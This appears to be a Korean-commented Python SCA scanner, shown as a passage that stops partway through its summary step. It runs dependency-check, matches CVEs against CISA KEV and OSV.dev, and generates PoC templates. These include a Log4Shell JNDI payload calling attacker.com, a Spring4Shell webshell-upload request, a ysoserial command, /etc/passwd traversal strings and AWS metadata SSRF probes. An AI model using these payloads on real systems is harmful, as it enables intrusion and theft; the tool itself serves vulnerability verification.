#!/usr/bin/env python3
"""
scan_sca.py — SCA(Software Composition Analysis) + CVE 관련성 분석 + PoC 생성

P2-01: 의존성 파일 스캔 → dependency-check 실행 → CVE 매핑 → 공통 스키마 출력
P2-02: CVE Exploit/PoC 악용 가능성 분석 → CISA KEV 조회 → 실제 사용 여부 판별 → PoC 생성

워크플로:
  1. dependency-check 실행 (--dc-report 로 기존 JSON 재사용 가능)
  2. CVE 파싱 + CVSS ≥ threshold 필터
  3. CISA KEV 조회 (actively exploited CVE 식별)
  4. OSV.dev API 추가 정보 수집
  5. 소스코드 관련성 분석 (groupId/artifactId 기반 usage grep)
  6. PoC 코드 자동 생성 (CWE 유형별 템플릿)
  7. 결과를 공통 스키마로 출력

사용법:
    # [권장] 빌드된 fat JAR 직접 스캔 (가장 정확 — nested JAR 포함 전체 dependency tree)
    python3 scan_sca.py testbed/gws/oki-be \\
        --jar build/libs/oki-admin-rest-api-1.0.0.jar \\
        --project gws-oki-admin \\
        --poc \\
        --output state/gws_oki_admin_sca.json
    # → NVD_API_KEY는 .env에서 자동 로드, dc-home은 기본 경로 자동 탐색

    # 기존 dependency-check 리포트 재사용 (재실행 없이 분석만)
    python3 scan_sca.py testbed/gws/oki-be \\
        --dc-report state/dc_gws-oki-admin.json \\
        --poc --output state/gws_oki_admin_sca.json

    # dc-home 명시 + NVD API key 직접 지정
    python3 scan_sca.py testbed/gws/oki-be \\
        --jar build/libs/app.jar \\
        --dc-home "/mnt/c/GEUN/tools_geun/2. dependency-check-12.1.0-release(라이브러리 점검도구)/dependency-check" \\
        --nvd-api-key "YOUR-KEY" \\
        --output state/gws_sca.json --poc

실행되는 dependency-check 커맨드 (참고):
    dependency-check.sh \\
        -s <jar_path>              # fat JAR 직접 지정 (nested JAR 자동 재귀 스캔)
        --project <name> \\
        --format JSON \\
        --out <output_dir> \\
        --nvdApiKey <key> \\        # .env NVD_API_KEY 자동 사용
        --disableOssIndex \\        # Sonatype OSS Index 비활성화 (rate limit 방지)
        --prettyPrint
"""

import argparse
import json
import os
import re
import subprocess
import sys
import tempfile
import time
import urllib.request
import urllib.error
from datetime import datetime
from pathlib import Path
from typing import Optional


def _load_env_file(env_path: Path = Path(".env")) -> dict:
    """`.env` 파일에서 KEY=VALUE 형식으로 환경 변수를 로드한다."""
    env = {}
    if not env_path.exists():
        return env
    for line in env_path.read_text(encoding="utf-8").splitlines():
        line = line.strip()
        if not line or line.startswith("#") or "=" not in line:
            continue
        key, _, val = line.partition("=")
        env[key.strip()] = val.strip().strip('"').strip("'")
    return env


# .env에서 NVD_API_KEY 자동 로드 (실행 시점)
_ENV_VARS: dict = _load_env_file(Path(__file__).parent.parent.parent / ".env")

# ─────────────────────────────────────────────────────────────────
# 상수
# ─────────────────────────────────────────────────────────────────

# CISA KEV (Known Exploited Vulnerabilities) 공개 피드
_CISA_KEV_URL = "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
# OSV.dev API
_OSV_API_URL = "https://api.osv.dev/v1/query"

# CVSS 기본 필터 기준 (이하는 정보로만 기록)
_DEFAULT_CVSS_THRESHOLD = 7.0

# CWE → PoC 유형 매핑
_CWE_POC_TYPE_MAP = {
    "CWE-89":  "sqli",
    "CWE-79":  "xss",
    "CWE-22":  "path_traversal",
    "CWE-94":  "rce_code_injection",
    "CWE-502": "deserialization",
    "CWE-918": "ssrf",
    "CWE-611": "xxe",
    "CWE-400": "dos",
    "CWE-200": "info_disclosure",
    "CWE-287": "auth_bypass",
}

# 잘 알려진 CVE → PoC 세부 설명 (최신 순)
_KNOWN_CVE_POC = {
    "CVE-2021-44228": {
        "name": "Log4Shell",
        "type": "rce_jndi",
        "payload": "${jndi:ldap://attacker.com/x}",
        "description": "Log4j2 JNDI 인젝션 — 사용자 입력이 log.error() 등에 전달되면 원격 코드 실행",
    },
    "CVE-2022-22965": {
        "name": "Spring4Shell",
        "type": "rce_classloader",
        "description": "Spring MVC DataBinder를 통한 ClassLoader 조작 → JSP webshell 업로드",
    },
    "CVE-2022-22963": {
        "name": "Spring Cloud Function SpEL RCE",
        "type": "rce_spel",
        "description": "Spring Cloud Function routing-expression 헤더를 통한 SpEL 인젝션",
    },
    "CVE-2022-22947": {
        "name": "Spring Cloud Gateway SSRF/RCE",
        "type": "ssrf_spel",
        "description": "Actuator gateway endpoint를 통한 SpEL 인젝션",
    },
    "CVE-2021-21315": {
        "name": "systeminformation RCE",
        "type": "rce_cmd_injection",
        "description": "systeminformation npm 패키지 Command Injection",
    },
    "CVE-2023-34035": {
        "name": "Spring Security Authorization Bypass",
        "type": "auth_bypass",
        "description": "requestMatchers 패턴 매칭 우회로 인한 인가 생략",
    },
    "CVE-2024-38819": {
        "name": "Spring Framework Path Traversal",
        "type": "path_traversal",
        "description": "WebMVC functional routing 통한 Path Traversal",
    },
    "CVE-2023-20883": {
        "name": "Spring Boot Actuator DoS",
        "type": "dos",
        "description": "Spring Boot Actuator /actuator/health 반복 호출로 OOM 발생",
    },
}


# ─────────────────────────────────────────────────────────────────
# HTTP 유틸리티 (requests 없을 때 urllib fallback)
# ─────────────────────────────────────────────────────────────────

def _http_get_json(url: str, timeout: int = 15) -> Optional[dict | list]:
    """GET 요청 → JSON 파싱. 실패 시 None 반환."""
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "scan_sca/1.0"})
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return json.loads(resp.read().decode("utf-8"))
    except Exception:
        return None


def _http_post_json(url: str, body: dict, timeout: int = 15) -> Optional[dict]:
    """POST JSON 요청 → JSON 파싱."""
    try:
        data = json.dumps(body).encode("utf-8")
        req = urllib.request.Request(
            url, data=data,
            headers={"Content-Type": "application/json", "User-Agent": "scan_sca/1.0"},
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return json.loads(resp.read().decode("utf-8"))
    except Exception:
        return None


# ─────────────────────────────────────────────────────────────────
# 1. dependency-check 실행
# ─────────────────────────────────────────────────────────────────

def _find_dc_script(dc_home: Optional[Path]) -> Optional[Path]:
    """dependency-check.sh 경로 탐색."""
    candidates = []
    if dc_home:
        candidates += [
            dc_home / "bin" / "dependency-check.sh",
            dc_home / "dependency-check.sh",
        ]
    # 기본 경로 탐색
    default_win = Path("/mnt/c/GEUN/tools_geun") / \
        "2. dependency-check-12.1.0-release(라이브러리 점검도구)/dependency-check/bin/dependency-check.sh"
    candidates.append(default_win)

    for c in candidates:
        if c.exists() and os.access(c, os.X_OK):
            return c
    return None


def run_dependency_check(
    scan_target: Path,
    dc_home: Optional[Path],
    project_name: str,
    output_dir: Path,
    nvd_api_key: Optional[str] = None,
    timeout: int = 900,
) -> Optional[Path]:
    """dependency-check를 실행하고 JSON 리포트 경로를 반환한다.

    스캔 대상:
    - fat JAR 지정 시: JAR 직접 스캔 (nested BOOT-INF/lib/*.jar 재귀 포함) — 가장 정확
    - 디렉토리 지정 시: 디렉토리 내 모든 JAR/의존성 파일 스캔

    실행 커맨드 (fat JAR 예시):
        dependency-check.sh -s app-1.0.0.jar --project gws-oki \\
            --format JSON --out state/ \\
            --nvdApiKey <key> --disableOssIndex --prettyPrint
    """
    dc_script = _find_dc_script(dc_home)
    if not dc_script:
        print("  ⚠️  dependency-check.sh 를 찾을 수 없습니다. --dc-home 을 지정하거나 PATH에 추가하세요.")
        return None

    # NVD API Key: 인수 > .env > 없음(rate-limited fallback)
    api_key = nvd_api_key or _ENV_VARS.get("NVD_API_KEY") or ""

    output_dir.mkdir(parents=True, exist_ok=True)
    safe_name = re.sub(r"[^\w\-]", "_", project_name)
    json_report = output_dir / f"dc_{safe_name}.json"

    # fat JAR이면 `-s <jar>`, 디렉토리면 `-s <dir>`
    # dependency-check -s 는 Spring Boot nested JAR(BOOT-INF/lib/)을 재귀 분석함
    cmd = [
        "bash", str(dc_script),
        "-s", str(scan_target),           # 스캔 대상 (JAR 또는 디렉토리)
        "--project", project_name,
        "--format", "JSON",
        "--out", str(output_dir),
        "--disableOssIndex",               # Sonatype OSS Index 비활성화 (rate limit 방지)
        "--prettyPrint",
    ]
    if api_key:
        cmd += ["--nvdApiKey", api_key]
        print(f"  NVD API Key: {'*' * 8}{api_key[-4:] if len(api_key) > 4 else '****'}")
    else:
        print("  ⚠️  NVD API Key 없음 — rate-limited 다운로드 사용 (느릴 수 있음)")
        print("     .env에 NVD_API_KEY=<key> 를 추가하면 자동 사용됩니다.")

    scan_type = "fat JAR" if scan_target.suffix in (".jar", ".war") else "디렉토리"
    print(f"  스캔 대상({scan_type}): {scan_target}")
    print(f"  커맨드: bash {dc_script.name} -s <target> --project {project_name} "
          f"--format JSON --disableOssIndex {'--nvdApiKey ***' if api_key else ''}")

    try:
        proc = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout,
        )
        # dependency-check는 취약점 발견 시에도 rc=0, 실패는 rc≠0
        if proc.returncode not in (0, 1):
            print(f"  ❌ dependency-check 실패 (rc={proc.returncode})")
            if proc.stderr:
                print(f"     stderr: {proc.stderr[:400]}")
            return None
    except subprocess.TimeoutExpired:
        print(f"  ❌ dependency-check 타임아웃 ({timeout}초)")
        return None
    except Exception as e:
        print(f"  ❌ dependency-check 실행 오류: {e}")
        return None

    # 출력 파일 탐색 (dependency-check 기본 파일명 → safe_name으로 rename)
    for candidate_name in ("dependency-check-report.json", f"{project_name}.json"):
        candidate = output_dir / candidate_name
        if candidate.exists():
            if candidate != json_report:
                candidate.rename(json_report)
            print(f"  ✅ 리포트 생성 완료: {json_report}")
            return json_report

    if json_report.exists():
        return json_report

    # 출력 디렉토리에서 최신 JSON 탐색 (파일명이 다를 경우 fallback)
    json_candidates = sorted(output_dir.glob("*.json"), key=lambda p: p.stat().st_mtime, reverse=True)
    if json_candidates:
        latest = json_candidates[0]
        latest.rename(json_report)
        print(f"  ✅ 리포트 생성 완료 (rename): {json_report}")
        return json_report

    print(f"  ⚠️  리포트 파일을 찾을 수 없습니다: {output_dir}")
    return None


# ─────────────────────────────────────────────────────────────────
# 2. dependency-check JSON 파싱
# ─────────────────────────────────────────────────────────────────

def parse_dc_report(report_path: Path, cvss_threshold: float = _DEFAULT_CVSS_THRESHOLD) -> list[dict]:
    """dependency-check JSON 리포트에서 CVE 목록을 파싱한다."""
    with open(report_path, encoding="utf-8") as f:
        data = json.load(f)

    findings = []
    for dep in data.get("dependencies", []):
        vulns = dep.get("vulnerabilities", [])
        if not vulns:
            continue

        # 패키지 식별
        pkg_id = ""
        for p in dep.get("packages", []):
            pkg_id = p.get("id", "")
            if pkg_id:
                break
        if not pkg_id:
            pkg_id = dep.get("fileName", "unknown")

        # 버전 추출
        version = ""
        m = re.search(r"@([\d.]+)", pkg_id)
        if m:
            version = m.group(1)

        for vuln in vulns:
            # CVSS 점수 추출 (v3 우선, v2 fallback)
            cvss = 0.0
            cvss_vector = ""
            cvssv3 = vuln.get("cvssv3", {})
            cvssv2 = vuln.get("cvssv2", {})
            if cvssv3:
                cvss = float(cvssv3.get("baseScore", 0))
                cvss_vector = cvssv3.get("vectorString", "")
            elif cvssv2:
                cvss = float(cvssv2.get("score", 0))
                cvss_vector = cvssv2.get("vectorString", "")

            severity = vuln.get("severity", "UNKNOWN").upper()
            if cvss >= 9.0:
                severity = "Critical"
            elif cvss >= 7.0:
                severity = "High"
            elif cvss >= 4.0:
                severity = "Medium"
            elif cvss > 0:
                severity = "Low"

            # CWE 추출
            cwes = []
            for cwe in vuln.get("cwes", []):
                if isinstance(cwe, str) and cwe.startswith("CWE-"):
                    cwes.append(cwe)
                elif isinstance(cwe, dict):
                    cwes.append(cwe.get("id", ""))

            # 수정 버전
            fixed_in = ""
            for ref in vuln.get("references", []):
                url = ref.get("url", "")
                name = ref.get("name", "")
                if "fixed" in name.lower() or "patch" in name.lower():
                    fixed_in = name
                    break

            findings.append({
                "dependency": pkg_id,
                "file_name": dep.get("fileName", ""),
                "version": version,
                "cve_id": vuln.get("name", ""),
                "cvss_score": cvss,
                "cvss_vector": cvss_vector,
                "severity": severity,
                "cwes": cwes,
                "description": vuln.get("description", ""),
                "references": [r.get("url", "") for r in vuln.get("references", [])[:5]],
                "fixed_in": fixed_in,
                "_include": cvss >= cvss_threshold,  # threshold 미만은 정보로만
            })

    # CVSS 내림차순 정렬
    findings.sort(key=lambda x: x["cvss_score"], reverse=True)
    return findings


# ─────────────────────────────────────────────────────────────────
# 3. CISA KEV 조회
# ─────────────────────────────────────────────────────────────────

_kev_cache: Optional[set] = None

def load_cisa_kev() -> set:
    """CISA KEV CVE ID 집합을 로드한다 (캐시 적용)."""
    global _kev_cache
    if _kev_cache is not None:
        return _kev_cache

    print("  CISA KEV 피드 로드 중...")
    data = _http_get_json(_CISA_KEV_URL, timeout=20)
    if data and "vulnerabilities" in data:
        _kev_cache = {v["cveID"] for v in data["vulnerabilities"]}
        print(f"  → KEV {len(_kev_cache)}건 로드 완료")
    else:
        _kev_cache = set()
        print("  ⚠️  CISA KEV 로드 실패 (네트워크 확인)")
    return _kev_cache


# ─────────────────────────────────────────────────────────────────
# 4. OSV.dev 추가 정보 조회
# ─────────────────────────────────────────────────────────────────

def query_osv(cve_id: str) -> Optional[dict]:
    """OSV.dev에서 CVE 관련 추가 정보를 조회한다."""
    body = {"id": cve_id}
    return _http_post_json(_OSV_API_URL, body, timeout=10)


# ─────────────────────────────────────────────────────────────────
# 5. 소스코드 관련성 분석
# ─────────────────────────────────────────────────────────────────

def _pkg_to_search_terms(pkg_id: str) -> list[str]:
    """패키지 ID에서 소스코드 검색 키워드를 추출한다.

    pkg:maven/org.springframework/spring-webmvc@5.3.20
    → ['springframework', 'spring-webmvc', 'WebMvc']
    """
    terms = []
    # pkg:maven/groupId/artifactId@version 형식
    m = re.search(r"pkg:maven/([^/]+)/([^@]+)", pkg_id)
    if m:
        group = m.group(1)   # org.springframework
        artifact = m.group(2)  # spring-webmvc
        # 그룹의 마지막 세그먼트 (springframework)
        terms.append(group.split(".")[-1])
        terms.append(artifact)
        # CamelCase 변환 (spring-webmvc → SpringWebmvc)
        camel = "".join(w.capitalize() for w in artifact.split("-"))
        if camel != artifact:
            terms.append(camel)
    # pkg:npm/axios@1.0.0
    m = re.search(r"pkg:npm/([^@]+)", pkg_id)
    if m:
        terms.append(m.group(1).lstrip("@"))
    # fallback: filename
    if not terms and pkg_id:
        base = re.sub(r"[^a-zA-Z0-9]", " ", pkg_id).strip()
        terms = base.split()[:2]

    return list(dict.fromkeys(terms))  # 중복 제거 + 순서 유지


def analyze_relevance(pkg_id: str, source_dir: Path) -> dict:
    """소스 코드에서 해당 패키지의 실제 사용 여부를 분석한다.

    Returns:
        {
          "judgment": "실제사용" | "간접사용" | "미확인",
          "usage_evidence": [...],
          "notes": str
        }
    """
    terms = _pkg_to_search_terms(pkg_id)
    if not terms:
        return {"judgment": "미확인", "usage_evidence": [], "notes": "패키지 검색어 추출 실패"}

    evidence = []
    import_count = 0
    usage_count = 0

    for term in terms[:3]:
        # import 구문 탐색
        try:
            result = subprocess.run(
                ["grep", "-rl", "--include=*.java", "--include=*.kt",
                 "--include=*.xml", "--include=*.gradle", "--include=*.properties",
                 term, str(source_dir)],
                capture_output=True, text=True, timeout=20,
            )
            matched_files = result.stdout.strip().splitlines()
            for fpath in matched_files[:5]:
                # import 구문인지 호출인지 구분
                result2 = subprocess.run(
                    ["grep", "-n", "-m", "3", term, fpath],
                    capture_output=True, text=True, timeout=5,
                )
                for line in result2.stdout.splitlines():
                    if "import " in line.lower():
                        import_count += 1
                    else:
                        usage_count += 1
                    rel = str(Path(fpath).relative_to(source_dir)) if source_dir in Path(fpath).parents else fpath
                    evidence.append(f"{rel}: {line.strip()[:120]}")
        except Exception:
            pass

    if not evidence:
        # pom.xml / build.gradle 에서라도 확인
        for build_file in source_dir.glob("**/pom.xml"):
            try:
                content = build_file.read_text(encoding="utf-8", errors="replace")
                for term in terms[:2]:
                    if term in content:
                        evidence.append(f"pom.xml: {term} 포함 (의존성 선언)")
                        import_count += 1
            except Exception:
                pass
        for build_file in source_dir.glob("**/build.gradle*"):
            try:
                content = build_file.read_text(encoding="utf-8", errors="replace")
                for term in terms[:2]:
                    if term in content:
                        evidence.append(f"{build_file.name}: {term} 포함")
                        import_count += 1
            except Exception:
                pass

    if usage_count >= 1:
        judgment = "실제사용"
        notes = f"소스코드에서 직접 호출 {usage_count}건, import {import_count}건 확인"
    elif import_count >= 1:
        judgment = "간접사용"
        notes = f"import/의존성 선언 {import_count}건 확인 (직접 호출 미탐지)"
    else:
        judgment = "미확인"
        notes = "소스코드에서 사용 흔적을 찾지 못했습니다 (빌드 의존성에만 포함되었을 수 있음)"

    return {
        "judgment": judgment,
        "usage_evidence": evidence[:10],
        "notes": notes,
    }


# ─────────────────────────────────────────────────────────────────
# 6. PoC 코드 생성 (CWE + CVE 유형 기반)
# ─────────────────────────────────────────────────────────────────

def _poc_deserialization(cve_id: str, pkg: str) -> dict:
    return {
        "type": "junit5",
        "description": f"[{cve_id}] 역직렬화 취약점 — 악성 직렬화 페이로드 전송 테스트",
        "requires_running_server": True,
        "code": f"""\
import org.junit.jupiter.api.Test;
import java.net.http.*;
import java.net.URI;
import java.util.Base64;

/**
 * PoC: {cve_id} — 역직렬화(Deserialization) 취약점 검증
 * 패키지: {pkg}
 *
 * 주의: 실제 서버가 실행 중이어야 합니다.
 * ysoserial 등의 도구로 페이로드를 생성하세요:
 *   java -jar ysoserial.jar CommonsCollections6 "touch /tmp/pwned" | base64
 */
class {cve_id.replace('-', '')}DeseriPocTest {{
    private static final String TARGET_URL = "http://localhost:8080/your-endpoint";
    private static final String MALICIOUS_PAYLOAD_B64 = "REPLACE_WITH_YSOSERIAL_PAYLOAD";

    @Test
    void testDeserializationVuln() throws Exception {{
        byte[] payload = Base64.getDecoder().decode(MALICIOUS_PAYLOAD_B64);
        HttpClient client = HttpClient.newHttpClient();
        HttpRequest req = HttpRequest.newBuilder()
            .uri(URI.create(TARGET_URL))
            .header("Content-Type", "application/x-java-serialized-object")
            .POST(HttpRequest.BodyPublishers.ofByteArray(payload))
            .build();
        HttpResponse<String> resp = client.send(req, HttpResponse.BodyHandlers.ofString());
        // 서버 오류(500) 또는 타임아웃이 발생하면 취약 가능성 높음
        System.out.println("Response: " + resp.statusCode());
        // 추가 확인: /tmp/pwned 파일 생성 여부 (OOB 확인 필요)
    }}
}}
""",
    }


def _poc_log4shell(cve_id: str) -> dict:
    return {
        "type": "curl",
        "description": "[CVE-2021-44228] Log4Shell JNDI 인젝션 — 사용자 입력 필드 테스트",
        "requires_running_server": True,
        "code": """\
#!/bin/bash
# PoC: CVE-2021-44228 Log4Shell
# 사전 준비:
#   1. JNDI 리스너 서버 실행 (예: marshalsec, JNDI-Exploit-Kit)
#   2. 아래 CALLBACK_HOST를 리스너 IP/도메인으로 변경

TARGET="http://localhost:8080"
CALLBACK_HOST="your-callback-server.com"  # Burp Collaborator / interactsh 사용 권장

# 로그인 파라미터에 payload 삽입
curl -s -o /dev/null -w "%{http_code}" \\
  -H 'User-Agent: ${jndi:ldap://'"$CALLBACK_HOST"'/a}' \\
  -H 'X-Forwarded-For: ${jndi:ldap://'"$CALLBACK_HOST"'/b}' \\
  "$TARGET/api/login" -d 'username=${jndi:ldap://'"$CALLBACK_HOST"'/c}&password=test'

echo ""
echo "JNDI 콜백 서버에서 연결 수신 여부를 확인하세요."
echo "수신되면 CVE-2021-44228 (Log4Shell) 취약 확인됩니다."
""",
    }


def _poc_spring4shell(cve_id: str) -> dict:
    return {
        "type": "curl",
        "description": "[CVE-2022-22965] Spring4Shell — ClassLoader 조작을 통한 webshell 업로드",
        "requires_running_server": True,
        "code": """\
#!/bin/bash
# PoC: CVE-2022-22965 Spring4Shell
# 조건: Spring MVC + JDK 9+ + WAR 배포 (Tomcat)
# 취약하면 Tomcat webroot에 shell.jsp가 생성됩니다.

TARGET="http://localhost:8080/your-context"  # 실제 컨텍스트 경로로 변경

# webshell 업로드 시도
curl -s "$TARGET/your-endpoint" \\
  --data 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while(-1!%3D(a%3Din.read(b)))%7B%20out.println(new%20String(b))%3B%20%7D%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=' \\
  -H 'Content-Type: application/x-www-form-urlencoded' \\
  -H 'suffix: %>//' \\
  -H 'c1: Runtime' \\
  -H 'c2: <%' \\
  -H 'DNT: 1'

echo "성공 시 http://$TARGET/shell.jsp?pwd=j&cmd=id 로 RCE 확인"
""",
    }


def _poc_ssrf(cve_id: str, pkg: str) -> dict:
    return {
        "type": "curl",
        "description": f"[{cve_id}] SSRF — 내부 메타데이터 서버 접근 테스트",
        "requires_running_server": True,
        "code": f"""\
#!/bin/bash
# PoC: {cve_id} SSRF
# 패키지: {pkg}
TARGET="http://localhost:8080"
INTERNAL_URL="http://169.254.169.254/latest/meta-data/"  # AWS EC2 메타데이터

# SSRF 취약 파라미터 후보 (실제 엔드포인트로 변경 필요)
for param in url callback webhook redirect imageUrl; do
  echo "=== 파라미터: $param ==="
  curl -sv "$TARGET/api/endpoint?$param=$INTERNAL_URL" 2>&1 | \\
    grep -E "(HTTP/|< |169\\.254|meta-data)"
done
echo ""
echo "응답에 AWS 메타데이터 내용이 포함되면 SSRF 확인"
""",
    }


def _poc_path_traversal(cve_id: str, pkg: str) -> dict:
    return {
        "type": "curl",
        "description": f"[{cve_id}] Path Traversal — 임의 파일 읽기 테스트",
        "requires_running_server": True,
        "code": f"""\
#!/bin/bash
# PoC: {cve_id} Path Traversal
# 패키지: {pkg}
TARGET="http://localhost:8080"

TRAVERSAL_PAYLOADS=(
  "../../../etc/passwd"
  "..%2F..%2F..%2Fetc%2Fpasswd"
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
  "....//....//....//etc/passwd"
)

for payload in "${{TRAVERSAL_PAYLOADS[@]}}"; do
  echo "=== Payload: $payload ==="
  curl -sv "$TARGET/static/$payload" 2>&1 | grep -E "(root:|HTTP/|< )"
  sleep 0.5
done
""",
    }


def _poc_auth_bypass(cve_id: str, pkg: str) -> dict:
    return {
        "type": "junit5",
        "description": f"[{cve_id}] 인가 우회 — 보호된 엔드포인트 미인증 접근 테스트",
        "requires_running_server": True,
        "code": f"""\
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.web.servlet.MockMvc;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

/**
 * PoC: {cve_id} — 인가 우회 취약점 검증
 * 패키지: {pkg}
 */
@SpringBootTest
@AutoConfigureMockMvc
class {cve_id.replace('-', '')}AuthBypassTest {{
    @Autowired
    private MockMvc mockMvc;

    @Test
    void adminEndpointShouldRequireAuth() throws Exception {{
        // 인증 없이 관리자 엔드포인트 접근 시 401/403이어야 함
        mockMvc.perform(get("/admin/users"))
               .andExpect(status().isUnauthorized());  // 또는 isForbidden()
    }}

    @Test
    void bypassWithTrailingSlash() throws Exception {{
        // CVE-2023-34035: 경로 뒤 슬래시로 보안 규칙 우회
        mockMvc.perform(get("/admin/users/"))
               .andExpect(status().isUnauthorized());
    }}

    @Test
    void bypassWithCaseVariation() throws Exception {{
        // 대소문자 우회 시도
        mockMvc.perform(get("/ADMIN/users"))
               .andExpect(status().isUnauthorized());
    }}
}}
""",
    }


def _poc_generic(cve_id: str, cwes: list, pkg: str) -> dict:
    cwe = cwes[0] if cwes else "CWE-Unknown"
    return {
        "type": "manual",
        "description": f"[{cve_id}] {cwe} — 수동 검증 필요",
        "requires_running_server": False,
        "code": f"""\
# PoC: {cve_id}
# 패키지: {pkg}
# CWE: {cwe}
#
# 자동 PoC 템플릿 없음 — 아래 절차로 수동 검증:
#
# 1. CVE 상세: https://nvd.nist.gov/vuln/detail/{cve_id}
# 2. 해당 라이브러리의 취약 API/클래스를 소스코드에서 확인
# 3. 외부 입력 → 취약 API 경로가 존재하는지 taint 추적
# 4. 취약 버전 범위 확인 후 패치 버전으로 업그레이드
""",
    }


def generate_poc(cve_id: str, cwes: list, pkg: str) -> dict:
    """CVE ID와 CWE 목록을 기반으로 PoC 코드를 생성한다."""
    # 잘 알려진 CVE 우선
    if cve_id in _KNOWN_CVE_POC:
        info = _KNOWN_CVE_POC[cve_id]
        if info["type"] == "rce_jndi":
            return _poc_log4shell(cve_id)
        if info["type"] in ("rce_classloader",):
            return _poc_spring4shell(cve_id)
        if info["type"] == "auth_bypass":
            return _poc_auth_bypass(cve_id, pkg)
        if info["type"] == "ssrf_spel":
            return _poc_ssrf(cve_id, pkg)

    # CWE 기반
    for cwe in cwes:
        if cwe in ("CWE-502",):
            return _poc_deserialization(cve_id, pkg)
        if cwe in ("CWE-918",):
            return _poc_ssrf(cve_id, pkg)
        if cwe in ("CWE-22",):
            return _poc_path_traversal(cve_id, pkg)
        if cwe in ("CWE-287",):
            return _poc_auth_bypass(cve_id, pkg)

    return _poc_generic(cve_id, cwes, pkg)


# ─────────────────────────────────────────────────────────────────
# 7. 전체 분석 실행
# ─────────────────────────────────────────────────────────────────

def run_sca(
    source_dir: Path,
    dc_report_path: Optional[Path],
    dc_home: Optional[Path],
    jar_path: Optional[Path],
    nvd_api_key: Optional[str],
    project_name: str,
    state_dir: Path,
    cvss_threshold: float,
    include_poc: bool,
    skip_network: bool,
) -> dict:
    """SCA 전체 실행 — CVE 파싱 → 관련성 분석 → PoC 생성 → 결과 반환."""

    print(f"\n=== scan_sca.py — SCA 분석 ===")
    print(f"소스: {source_dir}")

    # ── Step 1: dependency-check 실행 or 기존 리포트 사용 ─────────
    if dc_report_path and dc_report_path.exists():
        print(f"\n[Step 1] 기존 dependency-check 리포트 사용: {dc_report_path}")
    else:
        print(f"\n[Step 1] dependency-check 실행 중...")
        scan_target = jar_path or source_dir
        dc_report_path = run_dependency_check(
            scan_target=scan_target,
            dc_home=dc_home,
            project_name=project_name,
            output_dir=state_dir,
            nvd_api_key=nvd_api_key,
        )
        if not dc_report_path:
            print("  ❌ dependency-check 실행 실패. --dc-report 로 기존 리포트를 제공하세요.")
            return {"error": "dependency-check 실패"}

    # ── Step 2: CVE 파싱 ──────────────────────────────────────────
    print(f"\n[Step 2] CVE 파싱 (CVSS ≥ {cvss_threshold})...")
    raw_findings = parse_dc_report(dc_report_path, cvss_threshold=0)  # 전체 파싱 후 필터
    total_vulns = len(raw_findings)
    high_vulns = [f for f in raw_findings if f["cvss_score"] >= cvss_threshold]
    print(f"  전체 CVE: {total_vulns}건, High/Critical (≥{cvss_threshold}): {len(high_vulns)}건")

    # ── Step 3: CISA KEV 조회 ─────────────────────────────────────
    kev_set = set()
    if not skip_network:
        print(f"\n[Step 3] CISA KEV 조회 중...")
        kev_set = load_cisa_kev()

    # ── Step 4~6: 각 CVE에 대해 관련성 분석 + PoC 생성 ───────────
    print(f"\n[Step 4~6] CVE별 관련성 분석 + PoC 생성...")
    findings_out = []
    counter = 0

    for raw in raw_findings:
        counter += 1
        cve_id = raw["cve_id"]
        pkg = raw["dependency"]
        cvss = raw["cvss_score"]
        cwes = raw["cwes"]
        include = raw["_include"]

        severity_label = raw["severity"]
        is_kev = cve_id in kev_set
        result = "취약" if (include or is_kev) else "정보"

        print(f"  [{counter:02d}] {cve_id} ({severity_label}, CVSS={cvss:.1f})"
              f"{' [KEV]' if is_kev else ''}")

        # 관련성 분석
        if source_dir.exists():
            relevance = analyze_relevance(pkg, source_dir)
        else:
            relevance = {"judgment": "미확인", "usage_evidence": [],
                         "notes": "소스 디렉토리 없음"}

        # 관련성에 따라 result 조정
        if relevance["judgment"] == "미확인" and not is_kev:
            result = "정보"
        elif relevance["judgment"] == "미확인" and is_kev:
            result = "취약"  # KEV는 미확인이라도 취약으로

        # OSV 추가 정보 (네트워크 허용 시)
        osv_info = {}
        if not skip_network and include:
            osv_info = query_osv(cve_id) or {}
            time.sleep(0.3)  # rate limit 방지

        # 알려진 CVE 메타
        known = _KNOWN_CVE_POC.get(cve_id, {})

        # PoC 생성: --poc 시 High/Critical(CVSS ≥ threshold) 전체 생성
        # (result가 "정보"여도 관련성 미확인으로 인한 것이면 PoC 제공)
        poc = {}
        if include_poc and cvss >= cvss_threshold:
            poc = generate_poc(cve_id, cwes, pkg)

        findings_out.append({
            "id": f"SCA-{counter:03d}",
            "source_tool": "SCA",
            "dependency": pkg,
            "file_name": raw.get("file_name", ""),
            "version": raw.get("version", ""),
            "cve_id": cve_id,
            "cve_name": known.get("name", ""),
            "cvss_score": cvss,
            "cvss_vector": raw.get("cvss_vector", ""),
            "severity": severity_label,
            "cwes": cwes,
            "description": raw.get("description", "")[:500],
            "references": raw.get("references", []),
            "fixed_in": raw.get("fixed_in", ""),
            "is_kev": is_kev,
            "exploit_available": bool(known),
            "relevance": relevance,
            "result": result,
            "poc": poc,
            "recommendation": _make_recommendation(cve_id, raw, is_kev, relevance),
        })

    # ── 요약 통계 ─────────────────────────────────────────────────
    vuln_count = sum(1 for f in findings_out if f["result"] == "취약")
